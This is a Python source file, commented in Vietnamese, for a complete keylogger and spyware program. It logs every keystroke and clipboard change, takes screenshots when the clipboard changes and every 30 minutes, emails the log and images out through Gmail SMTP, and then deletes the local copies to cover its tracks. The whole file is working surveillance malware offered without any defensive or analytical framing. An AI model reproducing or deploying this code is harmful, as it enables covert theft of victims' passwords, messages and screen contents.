import threading
import signal
import sys
import time
import os
from pathlib import Path
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import clipboard
import smtplib
import ssl
import certifi
import mimetypes
from email.message import EmailMessage

# === Cấu hình ===
LOG_FILE = Path("keystrokes.log")
EMAIL_SENDER = "sender@gmail.com"
EMAIL_PASSWORD = "password"
EMAIL_RECIPIENT = "receiver@gmail.com"
SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 465

# === Ghi log ===
def write_log(text):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(f"[{ts}] {text}\n")

def ensure_log_file():
    LOG_FILE.touch(exist_ok=True)

# === Gửi email ===
class SilentEmailSender:
    def __init__(self, file_path: Path, screenshot_paths: list):
        self.file_path = file_path
        self.screenshot_paths = screenshot_paths

    def send(self):
        try:
            msg = EmailMessage()
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECIPIENT
            msg["Subject"] = "Keystrokes Log and Screenshots"
            msg.set_content("Keystrokes log and multiple screenshots attached.")

            # Đính kèm file log
            mime, _ = mimetypes.guess_type(str(self.file_path))
            maintype, subtype = mime.split("/", 1) if mime else ("application", "octet-stream")
            with self.file_path.open("rb") as f:
                msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=self.file_path.name)

            # Đính kèm ảnh
            for img_path in self.screenshot_paths:
                mime, _ = mimetypes.guess_type(str(img_path))
                maintype, subtype = mime.split("/", 1) if mime else ("application", "octet-stream")
                with img_path.open("rb") as f:
                    msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=img_path.name)

            context = ssl.create_default_context(cafile=certifi.where())
            with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.send_message(msg)

            print(f"Email sent at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            print(f"Email error: {e}")

# === Chụp và gửi email ===
def capture_and_send(reason="Triggered"):
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_name = f"screenshot_{timestamp}.png"
        ImageGrab.grab().save(screenshot_name)

        screenshots = list(Path(".").glob("screenshot_*.png")) + list(Path(".").glob("copied_*.png"))
        sender = SilentEmailSender(LOG_FILE, screenshots)
        sender.send()

        write_log(f"<EMAIL SENT> Reason: {reason}")

        for img in screenshots:
            try:
                img.unlink()
                print(f"Deleted: {img.name}")
            except Exception as e:
                print(f"Error deleting {img.name}: {e}")

        with LOG_FILE.open("w", encoding="utf-8") as f:
            f.write("")
        print(f"Cleared log file: {LOG_FILE}")
    except Exception as e:
        print(f"Screenshot/email error ({reason}): {e}")

# === Keylogger ===
class KeyLogger:
    def __init__(self):
        self.listener = None

    def on_keypress(self, key):
        try:
            if hasattr(key, 'char') and key.char and ord(key.char) >= 32:
                write_log(key.char)
            elif hasattr(key, 'vk') and key.vk == 13:
                write_log("<Enter>")
            elif hasattr(key, 'vk') and key.vk == 8:
                write_log("<Backspace>")
        except Exception as e:
            write_log(f"<{key}> [Error: {e}]")

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_keypress)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()

# === Gửi định kỳ mỗi 30 phút ===
def periodic_sender():
    while True:
        time.sleep(1800)
        capture_and_send("Periodic 30-minute send")

# === Theo dõi clipboard ===
class ClipboardWatcher:
    def __init__(self, interval=1):
        self.interval = interval
        self.last_clipboard = ""

    def capture_screen(self) -> Path | None:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"copied_{timestamp}.png"
            img_path = Path(filename)
            ImageGrab.grab().save(img_path)
            print(f"Screenshot saved: {filename}")
            return img_path
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None

    def start(self):
        ensure_log_file()
        while True:
            try:
                current = clipboard.paste()
                if current != self.last_clipboard and current.strip():
                    self.last_clipboard = current
                    write_log(f"<Clipboard Copied>: {current}")
                    self.capture_screen()
                    capture_and_send("Clipboard changed")
                time.sleep(self.interval)
            except Exception as e:
                print(f"Clipboard watcher error: {e}")

# === Khi thoát chương trình ===
def on_exit(sig, frame):
    print("Stopping...")
    keylogger.stop()
    capture_and_send("Program exit")

    # Dọn dẹp sau khi gửi
    try:
        screenshots = [Path(f) for f in os.listdir() if f.startswith("copied_") or f.startswith("screenshot_")]
        for file in [LOG_FILE] + screenshots:
            file.unlink(missing_ok=True)
            print(f"Deleted: {file.name}")
    except Exception as e:
        print(f"Cleanup error: {e}")

    sys.exit(0)

# === Khởi chạy ===
if __name__ == "__main__":
    ensure_log_file()
    keylogger = KeyLogger()
    keylogger.start()
    threading.Thread(target=periodic_sender, daemon=True).start()
    watcher = ClipboardWatcher(interval=1)
    watcher.start()
    signal.signal(signal.SIGINT, on_exit)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        on_exit(None, None)
